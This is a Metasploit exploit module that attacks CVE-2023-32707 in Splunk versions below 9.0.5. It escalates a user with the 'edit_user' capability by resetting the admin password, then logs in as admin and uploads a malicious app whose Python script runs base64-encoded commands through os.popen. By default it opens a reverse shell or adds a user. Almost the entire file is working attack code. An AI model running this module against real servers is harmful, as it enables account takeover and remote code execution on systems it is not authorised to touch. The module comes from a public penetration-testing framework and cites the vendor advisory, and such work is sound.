##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck

  include Msf::Exploit::Remote::HttpClient

  attr_accessor :cookie

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Splunk "edit_user" Capability Privilege Escalation',
        'Description' => %q{
          A low-privileged user who holds a role that has the "edit_user" capability assigned to it
          can escalate their privileges to that of the admin user by providing a specially crafted web request.
          This is because the "edit_user" capability does not honor the "grantableRoles" setting in the authorize.conf
          configuration file, which prevents this scenario from happening.

          This exploit abuse this vulnerability to change the admin password and login with it to upload a malicious app achieving RCE.
        },
        'Author' => [
          'Mr Hack (try_to_hack) Santiago Lopez', # discovery
          'Heyder Andrade', # metasploit module
          'Redway Security <redwaysecurity.com>' # Writeup and PoC
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2023-32707' ],
          [ 'URL', 'https://advisory.splunk.com/advisories/SVD-2023-0602' ], # Vendor Advisory
          [ 'URL', 'https://blog.redwaysecurity.com/2023/09/exploit-cve-2023-32707.html' ], # Writeup
          [ 'URL', 'https://github.com/redwaysecurity/CVEs/tree/main/CVE-2023-32707' ] # PoC
        ],
        'Payload' => {
          'Space' => 1024,
          'DisableNops' => true
        },
        'Platform' => %w[linux unix win osx],
        'Targets' => [
          [
            'Splunk < 9.0.5, 8.2.11, and 8.1.14 / Linux',
            {
              'Arch' => ARCH_CMD,
              'Platform' => %w[linux unix],
              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_python' }
            }
          ],
          [
            'Splunk < 9.0.5, 8.2.11, and 8.1.14 / Windows',
            {
              'Arch' => ARCH_CMD,
              'Platform' => 'win',
              'DefaultOptions' => { 'PAYLOAD' => 'cmd/windows/adduser' }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 8000,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [
            IOC_IN_LOGS,
            ARTIFACTS_ON_DISK # app is uploaded
          ]
        },
        'DisclosureDate' => '2023-06-01'
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [true, 'The username with "edit_user" role to authenticate as']),
        OptString.new('PASSWORD', [true, 'The password for the specified username']),
        OptString.new('TARGET_USER', [true, 'The username to change the password for (default: admin)', 'admin']),
        OptString.new('TARGET_PASSWORD', [false, 'The new password to set for the admin user (default: random)']),
        OptString.new('APP_NAME', [false, 'The name of the app to upload (default: random)'])
      ]
    )

    register_advanced_options(
      [
        OptBool.new('ReturnOutput', [ true, 'Display command output', false ]),
        OptBool.new('DisableUpload', [ true, 'Disable the app upload if you have already performed it once', false ])
      ]
    )
  end

  def check
    splunk_login(datastore['USERNAME'], datastore['PASSWORD'])

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/en-US/splunkd/__raw/services/authentication/users/', datastore['USERNAME']),
      'method' => 'GET',
      'cookie' => cookie,
      'vars_get' => {
        'output_mode' => 'json'
      }
    })

    return CheckCode::Detected('Could not detect the version.') unless res&.code == 200

    body = res.get_json_document
    version = Rex::Version.new(body['generator']['version'])

    return CheckCode::Safe("Detected Splunk version #{version} which is not vulnerable") unless (
      version < Rex::Version.new('9.0.5') ||
      version < Rex::Version.new('8.2.11') ||
      version < Rex::Version.new('8.1.14')
    )

    print_status("Splunk version #{version} detected")
    capabilities = body['entry'].first['content']['capabilities']

    return CheckCode::Safe("User '#{datastore['USERNAME']}' does not have 'edit_user' capability") unless capabilities.include? 'edit_user'

    report_vuln(
      host: rhost,
      name: name,
      refs: references,
      info: [version]
    )

    CheckCode::Appears("User '#{datastore['USERNAME']}' has 'edit_user' capability")
  end

  def app_name
    @app_name ||= (datastore['APP_NAME'] || Faker::App.name).downcase.gsub(/\s/, '_')
  end

  def cleanup
    return unless session_created?

    super

    execute_command("bash -c 'rm -rf $SPLUNK_HOME/etc/apps/#{app_name}'")
    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/en-US/debug/refresh'),
      'method' => 'POST',
      'cookie' => cookie,
      'vars_post' => {
        'splunk_form_key' => cookies_hash['splunkweb_csrf_token_8000']
      }
    })
  end

  def exploit
    @password = datastore['TARGET_PASSWORD'] || Rex::Text.rand_text_alpha(rand(8..12))

    splunk_change_password(datastore['TARGET_USER'], @password)
    splunk_login(datastore['TARGET_USER'], @password)

    splunk_upload_app(app_name, datastore['SPLUNK_APP_FILE']) unless datastore['DisableUpload']

    job_id = execute_command(payload.encoded, { app_name: app_name })
    if datastore['ReturnOutput']
      print_status('Waiting for command output')
      print_line(spunk_fetch_job_output(app_name, job_id))
    else
      print_status('Waiting for session')
      handler
    end
  end

  def execute_command(cmd, opts = {})
    # cookies_hash = cookie.split(';').each_with_object({}) { |name, h| h[name.split('=').first.strip] = name.split('=').last.strip }

    res = send_request_cgi({
      'uri' => '/en-US/api/search/jobs',
      'method' => 'POST',
      'cookie' => cookie, # it assumes that the cookie is already set
      'headers' =>
        {
          'X-Requested-With' => 'XMLHttpRequest',
          'X-Splunk-Form-Key' => cookies_hash['splunkweb_csrf_token_8000']
        },
      'vars_post' =>
        {
          'auto_cancel' => '62',
          'status_buckets' => '300',
          'output_mode' => 'json',
          # 'search' => "search * | script msf_exec #{Rex::Text.encode_base64(cmd)}",
          'search' => "|  #{app_name} #{Rex::Text.encode_base64(cmd)}",
          'earliest_time' => '-24h@h',
          'latest_time' => 'now',
          'ui_dispatch_app' => (opts[:app_name]).to_s
        }
    })

    fail_with(Failure::UnexpectedReply, "Unable to execute command. Unexpected reply (HTTP #{res.code})") unless res&.code == 200

    body = res.get_json_document

    fail_with(Failure::UnexpectedReply, "Unable to execute command. Unexpected reply (HTTP #{res.code})") unless body['data']

    body['data']
  end

  def splunk_helper_extract_token(uri)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, uri),
      'method' => 'GET',
      'keep_cookies' => true
    })

    fail_with(Failure::Unreachable, 'Unable to get token') unless res&.code == 200

    "session_id_8000=#{rand_text_numeric(40)}; " << res.get_cookies
  end

  def splunk_login(username, password)
    # gets cval and splunkweb_uid cookies
    self.cookie = splunk_helper_extract_token('/en-US/account/login')

    # cookies_hash = cookie.split(';').each_with_object({}) { |name, h| h[name.split('=').first.strip] = name.split('=').last.strip }

    # login post, should get back the splunkd_8000 and splunkweb_csrf_token_8000 cookies
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/en-US/account/login'),
      'method' => 'POST',
      'cookie' => cookie,
      'vars_post' =>
        {
          'username' => username,
          'password' => password,
          'cval' => cookies_hash['cval']
        }
    })

    fail_with(Failure::UnexpectedReply, 'Unable to login') unless res&.code == 200

    cookie << " #{res.get_cookies}"

    # get session_id_8000 cookie

    # self.cookie_hash = cookie.split(';').each_with_object({ }) { |name, h| h[name.split('=').first] = name.split('=').last }
  end

  def splunk_change_password(username, password)
    # due to the AutoCheck mixin and the keep_cookies option, the cookie might be already set
    do_login(username, password) unless cookie

    print_status("Changing '#{username}' password to #{password}")
    res = send_request_cgi({
      'uri' => normalize_uri('/en-US/splunkd/__raw/services/authentication/users/', username),
      'method' => 'POST',
      'headers' => {
        'X-Splunk-Form-Key' => cookies_hash['splunkweb_csrf_token_8000'],
        'X-Requested-With' => 'XMLHttpRequest'
      },
      'cookie' => cookie,
      'vars_post' => {
        'output_mode' => 'json',
        'password' => password,
        'force-change-pass' => 0,
        'locked-out' => 0
      }
    })

    fail_with(Failure::UnexpectedReply, "Unable to change #{username}'s password.") unless res&.code == 200

    print_good("Password of the user '#{username}' has bee changed to #{password}")

    body = res.get_json_document
    capabilities = body['entry'].first['content']['capabilities']

    fail_with(Failure::BadConfig, "The user '#{username}' does not have 'install_app' capability. You may consider to target other user") unless capabilities.include? 'install_apps'
  end

  def splunk_upload_app(app_name, _file_name)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/en-US/manager/appinstall/_upload'),
      'method' => 'GET',
      'cookie' => cookie
    })

    fail_with(Failure::UnexpectedReply, 'Unable to get form state') unless res&.code == 200

    html = res.get_html_document

    print_status("Uploading file #{app_name}")

    boundary = '-' * 29 + rand_text_numeric(30)
    data = ''
    # fill the hidden fields from the form: state and splunk_form_key
    html.at('[id="installform"]').elements.each do |form|
      next unless form.attributes['value']

      data << "\r\n--#{boundary}\r\n"
      data << "Content-Disposition: form-data; name=\"#{form.attributes['name']}\"\r\n\r\n"
      data << form.attributes['value'].to_s
      data << "\r\n--#{boundary}\r\n"
    end

    data << "Content-Disposition: form-data; name=\"force\"\r\n\r\n"
    data << '1'
    data << "\r\n--#{boundary}\r\n"

    data << "Content-Disposition: form-data; name=\"appfile\"; filename=\"#{app_name}.tar.gz\"\r\n"
    data << "Content-Type: application/gzip\r\n\r\n"
    data << splunk_app
    data << "\r\n--#{boundary}--\r\n"

    res = send_request_cgi({
      'uri' => '/en-US/manager/appinstall/_upload',
      'method' => 'POST',
      'cookie' => cookie,
      'ctype' => "multipart/form-data; boundary=#{boundary}",
      'data' => data
    })

    if (res&.code == 303 || (res.code == 200 && res.body !~ /There was an error processing the upload/))
      print_good("#{app_name} successfully uploaded")
    else
      fail_with(Failure::Unknown, 'Error uploading App')
    end
  end

  def spunk_fetch_job_output(app_name, job_id)
    # http get to  /en-US/splunkd/__raw/servicesNS/redway/upload_app_exec/search/jobs/1693414901.69/results

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, "/en-US/splunkd/__raw/servicesNS/#{datastore['TARGET_USER']}/#{app_name}/search/jobs/#{job_id}/results"),
      'method' => 'GET',
      'keep_cookies' => true,
      'cookie' => cookie,
      'vars_get' => {
        'output_mode' => 'json'
      }
    })

    fail_with(Failure::UnexpectedReply, "Unable to get JOB results. Unexpected reply (HTTP #{res.code})") unless res&.code == 200

    body = res.get_json_document

    fail_with(Failure::UnexpectedReply, "Splunk reply: #{body['messages'].collect { |h| h['text'] if h['type'] == 'ERROR' }.join('\n')}") if body['results'].empty?

    Rex::Text.decode_base64(body['results'].first['result'])
  end

  def splunk_app
    # app_name = 'test_app_exec'
    # print_status("Creating an application package named: #{app_name}")
    # script_name = "#{Rex::Text.rand_text_alpha_lower(3..8)}.sh"

    # metadata folder
    metadata = <<~EOF
      [commands]
      export = system
    EOF

    # default folder
    commands_conf = <<~EOF
      [#{app_name}]
      type = python
      filename = #{app_name}.py
      local = false
      enableheader = false
      streaming = false
      perf_warn_limit = 0
    EOF

    app_conf = <<~EOF
      [launcher]
      author=#{Faker::Name.name}
      description=#{Faker::Lorem.sentence}
      version=#{Faker::App.version}

      [ui]
      is_visible = false
    EOF

    # bin folder
    msf_exec_py = <<~EOF
      import sys
      import base64
      import splunk.Intersplunk

      header = ["result"]

      results = []
      value_bytes = base64.b64decode(sys.argv[1])
      try:
          value_str = value_bytes.decode('utf-8')
          output = sys.modules['os'].popen(value_str).read()
          output_base64 = base64.b64encode(output.encode('utf-8')).decode('utf-8')
          results.append({"result": output_base64})

      except Exception as e:
          error_msg = "Error : " + str(e)
          results = splunk.Intersplunk.generateErrorResults(error_msg)

      splunk.Intersplunk.outputResults(results, fields=header)
    EOF

    tarfile = StringIO.new
    Rex::Tar::Writer.new tarfile do |tar|
      tar.add_file("#{app_name}/metadata/default.meta", 0o644) do |io|
        io.write metadata
      end
      tar.add_file("#{app_name}/default/commands.conf", 0o644) do |io|
        io.write commands_conf
      end
      tar.add_file("#{app_name}/default/app.conf", 0o644) do |io|
        io.write app_conf
      end
      tar.add_file("#{app_name}/bin/#{app_name}.py", 0o644) do |io|
        io.write msf_exec_py
      end
    end
    tarfile.rewind
    tarfile.close

    Rex::Text.gzip(tarfile.string)
  end

  def cookies_hash
    cookie.split(';').each_with_object({}) { |name, h| h[name.split('=').first.strip] = name.split('=').last.strip }
  end

end
